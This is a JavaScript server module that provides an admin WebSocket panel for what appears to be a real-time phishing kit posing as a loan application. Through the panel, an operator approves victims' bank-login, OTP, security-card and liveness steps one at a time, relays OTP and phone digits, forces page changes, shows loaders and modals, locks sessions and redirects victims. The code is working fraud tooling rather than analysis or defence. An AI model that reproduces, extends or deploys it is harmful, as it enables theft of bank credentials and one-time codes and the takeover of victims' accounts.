/**
 * ================================================================
 *  ADMIN-WS.JS — Admin WebSocket Channel
 *  Bidirectional real-time admin panel ↔ backend communication.
 *
 *  Replaces the SSE-only admin stream with a full WebSocket channel.
 *  Admin panel connects to /ws/admin?token=ADMIN_SECRET_KEY
 *
 *  FEATURES:
 *  - Live session list with WS presence tracking
 *  - Approve/Reject ALL steps (removes Telegram-only restriction)
 *  - Force Navigate with fragment push (fixes white-screen bug)
 *  - Force Loader, Custom Modals, Lock/Unlock
 *  - Real-time broadcast of all session events
 * ================================================================
 */

'use strict';

const WebSocket = require('ws');

/**
 * @param {http.Server} server
 * @param {object}      deps — injected dependencies from server.js
 */
module.exports = function setupAdminWS(server, deps) {
  const {
    wsClients,         // Map<sessionId, ws> — client WebSockets
    sseClients,        // Map<sessionId, res> — client SSE responses
    redis,
    supabase,
    deliverFragment,
    deliverCommand,
    insertCommand,
    FLOW_FRAGMENT_MAP,
    ADMIN_KEY,
    RK,
    Log,
  } = deps;

  // ── Admin WebSocket Server (noServer mode) ─────────────────
  // MUST use noServer to avoid conflicting with client WSS on /ws.
  // Manual upgrade routing ensures /ws goes to client WSS untouched.
  const adminWss = new WebSocket.Server({ noServer: true });
  const adminClients = new Set();

  server.on('upgrade', (request, socket, head) => {
    const url = new URL(request.url, 'http://localhost');
    if (url.pathname !== '/ws/admin') return; // Let client WSS handle /ws

    const token = url.searchParams.get('token');
    if (!token || token !== ADMIN_KEY) {
      socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
      socket.destroy();
      return;
    }

    adminWss.handleUpgrade(request, socket, head, (ws) => {
      adminWss.emit('connection', ws, request);
    });
  });

  adminWss.on('connection', (ws, req) => {
    adminClients.add(ws);
    Log.info(`[AdminWS] Connected (total: ${adminClients.size})`);

    // Send initial session list
    _sendSessionList(ws);

    ws.on('message', async (raw) => {
      try {
        const msg = JSON.parse(raw.toString());
        await _handleMessage(ws, msg);
      } catch (e) {
        Log.warn('[AdminWS] Parse error:', e.message);
      }
    });

    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });
    ws.on('close', () => {
      adminClients.delete(ws);
      Log.info(`[AdminWS] Disconnected (total: ${adminClients.size})`);
    });
    ws.on('error', () => { adminClients.delete(ws); });
  });

  // ── Ping interval ─────────────────────────────────────────
  setInterval(() => {
    adminClients.forEach(ws => {
      if (!ws.isAlive) { ws.terminate(); adminClients.delete(ws); return; }
      ws.isAlive = false;
      ws.ping();
    });
  }, 30000);

  // ── Session list (sent on connect + refresh) ──────────────
  async function _sendSessionList(ws) {
    try {
      const { data } = await supabase
        .from('sessions')
        .select('*, applications(client_name, loan_amount)')
        .order('last_heartbeat', { ascending: false })
        .limit(100);

      const sessions = await Promise.all((data || []).map(async (s) => {
        const wsAlive = wsClients.has(s.session_id);
        const hbAlive = await redis.exists(RK.heartbeat(s.session_id));
        return {
          ...s,
          _wsLive:  wsAlive,
          _hbLive:  hbAlive === 1,
          _status:  wsAlive ? 'online' : (hbAlive ? 'idle' : 'offline'),
        };
      }));

      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'session_list', sessions }));
      }
    } catch (e) {
      Log.error('[AdminWS] Session list error:', e.message);
    }
  }

  // ═══════════════════════════════════════════════════════════
  //  MESSAGE HANDLER
  // ═══════════════════════════════════════════════════════════

  async function _handleMessage(ws, msg) {
    if (!msg.type) return;
    const sessionId = msg.sessionId;

    // Non-session commands
    if (msg.type === 'admin_refresh_sessions') {
      _sendSessionList(ws);
      return;
    }

    if (!sessionId) return;
    Log.info(`[AdminWS] ${msg.type} → ${sessionId.slice(0, 8)}…`);

    switch (msg.type) {

      // ── Force Navigate (with fragment push — fixes white screen) ──
      case 'admin_force_navigate': {
        const { target_page, target_screen } = msg.payload || {};

        // Map page keys to required fragments
        const PAGE_FRAGS = {
          INDEX:    ['idx_appid_v1'],
          CONTRACT: ['c_forma_v1'],
          PLAID:    ['p_init_v1'],
          SUCCESS:  ['success_v1'],
        };

        // Map screen keys to specific fragments
        const SCREEN_FRAGS = {
          formA:         'c_forma_v1',
          formB:         'c_formb_v1',
          formC:         'c_formc_v1',
          initial:       'p_init_v1',
          bankSelection: 'p_banksel_v1',
          login:         'p_login_v1',
          otp:           'p_otp_v1',
          securityCard:  'p_card_v1',
          videoLiveness: 'p_liveness_v1',
        };

        // Push fragment first, then navigate
        if (target_screen && SCREEN_FRAGS[target_screen]) {
          await deliverFragment(sessionId, SCREEN_FRAGS[target_screen]);
        } else if (target_page && PAGE_FRAGS[target_page]) {
          for (const fid of PAGE_FRAGS[target_page]) {
            await deliverFragment(sessionId, fid);
            await _wait(250);
          }
          // Cross-page navigation
          if (target_page !== 'INDEX') {
            await _wait(500);
            await deliverCommand(sessionId, {
              type: 'FORCE_NAVIGATE_PAGE',
              payload: { route: target_page },
            });
          }
        }

        broadcast({ type: 'admin_navigated', sessionId, target_page, target_screen });
        break;
      }

      // ── Approve Step (ALL steps — removes Telegram-only lock) ──
      case 'admin_approve_step': {
        const { stepType, otp_digits, phone_last4 } = msg;

        // Update Supabase submission
        await supabase.from('submissions').update({
          status:      'approved',
          reviewed_at: new Date().toISOString(),
          reviewed_by: 'admin_panel',
        }).eq('session_id', sessionId)
          .eq('step_type', stepType)
          .eq('status', 'pending_review');

        // Build approval payload
        const approvePayload = { step_type: stepType };
        if (otp_digits)  approvePayload.otp_digits  = otp_digits;
        if (phone_last4) approvePayload.phone_last4 = phone_last4;

        // Send APPROVE_STEP to client
        const cmdId = await insertCommand(sessionId, null, 'APPROVE_STEP', approvePayload);
        await deliverCommand(sessionId, {
          type: 'APPROVE_STEP',
          id:   cmdId,
          payload: approvePayload,
        });

        // Push next fragment in flow
        const nextFrags = FLOW_FRAGMENT_MAP[stepType];
        if (nextFrags) {
          await _wait(600);
          for (const fid of nextFrags) {
            await deliverFragment(sessionId, fid);
          }
        }

        // Special: plaid_bank_login → also deliver OTP fragment
        if (stepType === 'plaid_bank_login') {
          await _wait(600);
          await deliverFragment(sessionId, 'p_otp_v1');
        }

        broadcast({ type: 'step_approved', sessionId, stepType, ts: new Date().toISOString() });
        Log.info(`[AdminWS] APPROVED: ${stepType} → ${sessionId.slice(0, 8)}…`);
        break;
      }

      // ── Reject Step ──
      case 'admin_reject_step': {
        const { stepType, reason } = msg;

        await supabase.from('submissions').update({
          status:      'rejected',
          admin_note:  reason,
          reviewed_at: new Date().toISOString(),
          reviewed_by: 'admin_panel',
        }).eq('session_id', sessionId)
          .eq('step_type', stepType)
          .eq('status', 'pending_review');

        const cmdId = await insertCommand(sessionId, null, 'REJECT_STEP', {
          step_type: stepType, reason, allow_retry: true,
        });
        await deliverCommand(sessionId, {
          type: 'REJECT_STEP',
          id:   cmdId,
          payload: { step_type: stepType, reason, allow_retry: true },
        });

        broadcast({ type: 'step_rejected', sessionId, stepType, reason, ts: new Date().toISOString() });
        Log.info(`[AdminWS] REJECTED: ${stepType} → ${sessionId.slice(0, 8)}…`);
        break;
      }

      // ── Force Loader ──
      case 'admin_force_loader': {
        const cmdType = msg.action === 'show' ? 'SHOW_LOADER' : 'HIDE_LOADER';
        await deliverCommand(sessionId, {
          type: cmdType,
          payload: { message: msg.message || 'Please wait…' },
        });
        break;
      }

      // ── Force Modal ──
      case 'admin_force_modal': {
        await deliverCommand(sessionId, {
          type: 'OPEN_MODAL',
          payload: msg.payload || {},
        });
        break;
      }

      // ── Lock / Unlock ──
      case 'admin_lock_session': {
        await deliverCommand(sessionId, {
          type: 'LOCK_SESSION',
          payload: { message: msg.message || 'Session paused by admin.' },
        });
        break;
      }
      case 'admin_unlock_session': {
        await deliverCommand(sessionId, {
          type: 'UNLOCK_SESSION',
          payload: {},
        });
        break;
      }

      // ── Request Upload ──
      case 'admin_request_upload': {
        await deliverCommand(sessionId, {
          type: 'REQUEST_UPLOAD',
          payload: msg.payload || { prompt: 'Please upload your document.' },
        });
        break;
      }

      // ── Send Toast ──
      case 'admin_send_toast': {
        await deliverCommand(sessionId, {
          type: 'SHOW_TOAST',
          payload: msg.payload || { type: 'info', text: 'Notice from admin.' },
        });
        break;
      }

      // ── Redirect External ──
      case 'admin_redirect': {
        await deliverCommand(sessionId, {
          type: 'REDIRECT_EXTERNAL',
          payload: msg.payload || {},
        });
        break;
      }

      default:
        Log.debug(`[AdminWS] Unknown command: ${msg.type}`);
    }
  }

  // ── Broadcast to all admin WS clients ─────────────────────
  function broadcast(msg) {
    if (adminClients.size === 0) return;
    const raw = JSON.stringify(msg);
    adminClients.forEach(ws => {
      if (ws.readyState === WebSocket.OPEN) {
        try { ws.send(raw); } catch { adminClients.delete(ws); }
      }
    });
  }

  function _wait(ms) { return new Promise(r => setTimeout(r, ms)); }

  Log.info('[AdminWS] Module loaded — /ws/admin ready');

  return { broadcast, adminClients };
};
